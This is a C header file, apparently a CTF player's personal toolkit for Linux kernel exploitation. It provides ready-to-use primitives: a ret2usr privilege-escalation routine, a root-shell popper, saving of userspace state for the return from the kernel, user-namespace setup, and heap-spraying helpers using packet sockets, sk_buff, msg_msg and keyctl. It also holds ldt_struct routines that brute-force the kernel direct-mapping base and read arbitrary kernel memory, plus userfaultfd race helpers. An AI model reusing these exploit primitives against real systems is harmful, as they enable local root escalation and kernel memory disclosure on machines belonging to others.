/**
 * @file kernel.h
 * @author arttnba3 (arttnba@gmail.com)
 * @brief arttnba3's personla utils for kernel pwn
 * @version 1.0
 * @date 2023-02-05
 * 
 * @copyright Copyright (c) 2023 arttnba3
 * 
 */
#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <asm/ldt.h>
#include <semaphore.h>
#include <poll.h>
#include <sched.h>
#include <linux/keyctl.h>

/**
 * I - fundamental functions
 * e.g. function to check and pop a root shell, user-status saver, etc.
 */

size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;

void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    exit(EXIT_FAILURE);
}

/* root checker and shell poper */
void getRootShell(void)
{   
    puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");

    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        exit(EXIT_FAILURE);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
    
    system("/bin/sh");
    
    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

/* userspace status saver */
size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

/* ret2usr attacker */
void getRootPrivilige(size_t prepare_kernel_cred, size_t commit_creds)
{
    void *(*prepare_kernel_cred_ptr)(void *) = 
                                         (void *(*)(void*)) prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = (int (*)(void*)) commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

/**
 * @brief create an isolate namespace
 * note that the caller **SHOULD NOT** be used to get the root, but an operator
 * to perform basic exploiting operations in it only
 */
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

/**
 * II - fundamental  kernel structures
 * e.g. list_head
 */
struct list_head {
    uint64_t    next;
    uint64_t    prev;
};

/**
 * III -  pgv pages sprayer related 
 * not that we should create two process:
 * - the parent is the one to send cmd and get root
 * - the child creates an isolate userspace by calling unshare_setup(),
 *      receiving cmd from parent and operates it only
 */
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/**
 * IV - keyctl related
*/

int key_alloc(char *description, char *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, char *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, char *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/**
 * V - sk_buff spraying related
 * note that the sk_buff's tail is with a 320-bytes skb_shared_info
 */
#define SOCKET_NUM 8
#define SK_BUFF_NUM 128

/**
 * socket's definition should be like:
 * int sk_sockets[SOCKET_NUM][2];
 */

int initSocketArray(int sk_socket[SOCKET_NUM][2])
{
    /* socket pairs to spray sk_buff */
    for (int i = 0; i < SOCKET_NUM; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i]) < 0) {
            printf("[x] failed to create no.%d socket pair!\n", i);
            return -1;
        }
    }

    return 0;
}

int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (write(sk_socket[i][0], buf, size) < 0) {
                printf("[x] failed to spray %d sk_buff for %d socket!", j, i);
                return -1;
            }
        }
    }

    return 0;
}

int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (read(sk_socket[i][1], buf, size) < 0) {
                puts("[x] failed to received sk_buff!");
                return -1;
            }
        }
    }

    return 0;
}

/**
 * VI - msg_msg related
*/

struct msg_msg {
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg {
    uint64_t    next;
};

/*
struct msgbuf {
    long mtype;
    char mtext[0];
};
*/

int getMsgQueue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void buildMsg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
              uint64_t m_type, uint64_t m_ts,  uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

/**
 * VII - ldt_struct related
*/

/* this should be referred to your kernel */
#define SECONDARY_STARTUP_64 0xffffffff81000060

/* desc initializer */
static inline void initializeDesc(struct user_desc *desc)
{
    /* init descriptor info */
    desc->base_addr = 0xff0000;
    desc->entry_number = 0x8000 / 8;
    desc->limit = 0;
    desc->seg_32bit = 0;
    desc->contents = 0;
    desc->limit_in_pages = 0;
    desc->lm = 0;
    desc->read_exec_only = 0;
    desc->seg_not_present = 0;
    desc->useable = 0;
}

/**
 * @brief burte-force hitting page_offset_base by modifying ldt_struct
 * 
 * @param ldt_cracker function to make the ldt_struct modifiable
 * @param cracker_args args of ldt_cracker
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param burte_size size of each burte-force hitting
 * @return size_t address of page_offset_base
 */
size_t ldtGuessingDirectMappingArea(void *(*ldt_cracker)(void*),
                                   void *cracker_args,
                                   void *(*ldt_momdifier)(void*, size_t), 
                                   void *momdifier_args,
                                   uint64_t burte_size)
{
    struct user_desc desc;
	uint64_t page_offset_base = 0xffff888000000000;
	uint64_t temp;
	char *buf;
    int retval;

    /* init descriptor info */
    initializeDesc(&desc);

    /* make the ldt_struct modifiable */
    ldt_cracker(cracker_args);
    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

    /* leak kernel direct mapping area by modify_ldt() */
    while(1) {
        ldt_momdifier(momdifier_args, page_offset_base);
        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
        if (retval > 0) {
            break;
        }
        else if (retval == 0) {
            errExit("no mm->context.ldt!");
        }
        page_offset_base += burte_size;
    }
    
    return page_offset_base;
}

/**
 * @brief read the contents from a specific kernel memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 * 
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param addr address of kernel memory to read
 * @param res_buf buf to be written the data from kernel memory
 */
void ldtArbitraryRead(void *(*ldt_momdifier)(void*, size_t), 
                      void *momdifier_args, size_t addr, char *res_buf)
{
    static char buf[0x8000];
    struct user_desc desc;
	uint64_t temp;
    int pipe_fd[2];

    /* init descriptor info */
    initializeDesc(&desc);

    /* modify the ldt_struct->entries to addr */
    ldt_momdifier(momdifier_args, addr);

    /* read data by the child process */
    pipe(pipe_fd);
    if (!fork()) {
        /* child */
        syscall(SYS_modify_ldt, 0, buf, 0x8000);
        write(pipe_fd[1], buf, 0x8000);
        exit(0);
    } else {
        /* parent */
        wait(NULL);
        read(pipe_fd[0], res_buf, 0x8000);
    }

    close(pipe_fd[0]);
    close(pipe_fd[1]);
}

/**
 * @brief seek specific content in the memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 * 
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param page_offset_base the page_offset_base we leakked before
 * @param mem_finder your own function to search on a 0x8000-bytes buf.
 *          It should be like `size_t func(void *args, char *buf)` and the `buf`
 *          is where we store the data from kernel in ldtSeekingMemory().
 *          The return val should be the offset of the `buf`, `-1` for failure
 * @param finder_args your own function's args
 * @return size_t kernel addr of content to find, -1 for failure
 */
size_t ldtSeekingMemory(void *(*ldt_momdifier)(void*, size_t), 
                        void *momdifier_args, uint64_t page_offset_base,
                        size_t (*mem_finder)(void*, char *), void *finder_args)
{
    static char buf[0x8000];
    size_t search_addr, result_addr = -1, offset;

    search_addr = page_offset_base;

    while (1) {
        ldtArbitraryRead(ldt_momdifier, momdifier_args, search_addr, buf);

        offset = mem_finder(finder_args, buf);
        if (offset != -1) {
            result_addr = search_addr + offset;
            break;
        }

        search_addr += 0x8000;
    }

    return result_addr;
}

/**
 * VIII - userfaultfd related code
 * note that there's no userfaultfd wrapper in musl lib
 */
#ifndef MUSL_COOMPILE

#include <linux/userfaultfd.h>

static pthread_t monitor_thread;

void registerUserFaultFd(void *addr, unsigned long len, void *(*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        errExit("pthread_create");
}

#endif



/**
 * IX - file and tty related structures 
 */

struct file_operations;
struct tty_struct;
struct tty_driver;
struct serial_icounter_struct;

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
};